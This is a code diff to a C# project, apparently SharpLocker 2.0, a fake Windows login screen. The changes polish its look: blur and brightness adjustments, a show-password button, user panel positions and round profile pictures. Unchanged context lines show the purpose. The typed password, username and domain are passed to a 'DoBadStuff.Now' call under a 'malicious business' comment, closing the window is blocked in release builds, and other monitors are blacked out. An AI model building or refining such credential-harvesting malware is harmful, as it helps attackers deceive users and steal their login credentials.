@@ -39,7 +39,7 @@ namespace SharpLocker_2._0
         private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
         {
 #if !DEBUG
-                e.Cancel = DenyClose;
+            e.Cancel = DenyClose;
 #endif
         }
 
@@ -65,7 +65,7 @@ namespace SharpLocker_2._0
 
             DenyClose = false;
 #if !DEBUG
-                KeyPressHandler.Enable();
+            KeyPressHandler.Enable();
 #endif
             // Time for malicious business 😏
             DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);
@@ -74,6 +74,13 @@ namespace SharpLocker_2._0
         }
 
         #region "Password"
+
+        // Show password when button is pressed
+        private void ShowPasswordButton_Click(object sender, EventArgs e)
+        {
+            if (PasswordTextBox.Text != PLACEHOLDER_TEXT)
+                PasswordTextBox.UseSystemPasswordChar = !PasswordTextBox.UseSystemPasswordChar;
+        }
 
         private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
         {
@@ -110,7 +117,7 @@ namespace SharpLocker_2._0
             {
                 tb.UseSystemPasswordChar = true;
                 tb.Font = new Font("Microsoft Sans Serif", 23.25f);
-                tb.Text = tb.Text.Substring(tb.Text.Length - 1);
+                tb.Text = tb.Text.Substring(0, 1);
                 tb.ForeColor = Color.Black;
                 tb.Select(1, 0);
             }
@@ -216,13 +223,19 @@ namespace SharpLocker_2._0
                 "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));
 
         // Set the users wallpaper as the form background
-        private void InitializeBackground() => BackgroundImage = GetBackgroundImage();
-
+        private void InitializeBackground()
+        {
+            BackgroundImage = GetBackgroundImage();
+        }
         // blur the users wallpaper and set it as the form background
         private void BlurBackground()
         {
             GaussianBlur blur = new GaussianBlur(GetBackgroundImage());
-            BackgroundImage = blur.Process(2);
+            BackgroundImage = blur.Process(10);
+
+            if (BackgroundImage.IsPixelBright(11, 387) || //Bottom left
+                BackgroundImage.IsPixelBright(EaseOfAccessButton.Location.X, EaseOfAccessButton.Location.Y) ||
+                BackgroundImage.IsPixelBright(UserNameLabel.Location.X, UserNameLabel.Location.Y)) BackgroundImage.AdjustBrightness(-80);
         }
 
         // Load the current users profile picture into the form
@@ -277,48 +290,17 @@ namespace SharpLocker_2._0
 
 
             // resize image and make it a circle
-             pb.Image = ResizeImage(img, pb.Width, pb.Height);
-
-            GraphicsPath gp = new GraphicsPath();
-            gp.AddEllipse(0, 0, pb.Width - 1, pb.Height - 1);
-            Region rg = new Region(gp);
-            pb.Region = rg;
-        }
-
-        // Resize any image to a certain size
-        public Bitmap ResizeImage(Image image, int width, int height)
-        {
-            var destRect = new Rectangle(0, 0, width, height);
-            var destImage = new Bitmap(width, height);
-
-            destImage.SetResolution(image.HorizontalResolution, image.VerticalResolution);
-
-            using (var graphics = Graphics.FromImage(destImage))
-            {
-                graphics.CompositingMode = CompositingMode.SourceCopy;
-                graphics.CompositingQuality = CompositingQuality.HighQuality;
-                graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
-                graphics.SmoothingMode = SmoothingMode.HighQuality;
-                graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
-
-                using (var wrapMode = new ImageAttributes())
-                {
-                    wrapMode.SetWrapMode(WrapMode.TileFlipXY);
-                    graphics.DrawImage(image, destRect, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, wrapMode);
-                }
-            }
-
-            return destImage;
+            pb.Image = img.ResizeImage(pb.Width, pb.Height);
         }
 
         // on release builds, black out all non-primary screens
         private void InitializeOtherScreens()
         {
 #if !DEBUG
-                foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
-                {
-                    new Task(() => BlackScreen(screen)).Start();
-                }
+            foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
+            {
+                new Task(() => BlackScreen(screen)).Start();
+            }
 #endif
         }
 
@@ -361,8 +343,8 @@ namespace SharpLocker_2._0
         // create a "other user" control with given properties, then place it on screen
         private void AddChangeUserPanel(string user, int panelCount)
         {
-            int panelX = 12;
-            int panelY = 388;
+            int panelX = 30;
+            int panelY = 380;
             int panelWidth = 200;
             int panelHeight = 50;
 
@@ -384,7 +366,8 @@ namespace SharpLocker_2._0
                 Size = new Size(panelWidth, panelHeight),
                 BorderStyle = BorderStyle.None,
                 BackColor = Color.Transparent,
-                BackgroundImageLayout = ImageLayout.Stretch
+                BackgroundImageLayout = ImageLayout.Stretch,
+                TabStop = false
             };
 
             if (!(user is null) && user == UserNameLabel.Text) p.BackgroundImage = Properties.Resources.defaultButtonBackground;
@@ -399,13 +382,14 @@ namespace SharpLocker_2._0
                 p.BackColor = Color.Transparent;
             };
 
-            PictureBox pb = new PictureBox()
+            RoundPictureBox pb = new RoundPictureBox()
             {
                 BackColor = Color.Transparent,
                 Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
                 BackgroundImageLayout = ImageLayout.Stretch,
                 Size = new Size(pictureBoxWidth, pictureBoxHeight),
-                Location = new Point(pictureBoxX, pictureBoxY)
+                Location = new Point(pictureBoxX, pictureBoxY),
+                TabStop = false
             };
 
             pb.MouseEnter += (s, e) =>
@@ -428,7 +412,8 @@ namespace SharpLocker_2._0
                 Font = new Font("Segoe UI", 13),
                 ForeColor = Color.White,
                 Text = user,
-                TextAlign = ContentAlignment.MiddleLeft
+                TextAlign = ContentAlignment.MiddleLeft,
+                TabStop = false
             };
 
             b.MouseEnter += (s, e) =>
@@ -451,6 +436,7 @@ namespace SharpLocker_2._0
             p.Controls.Add(b);
             Controls.Add(p);
         }
+
     }
 
     #endregion
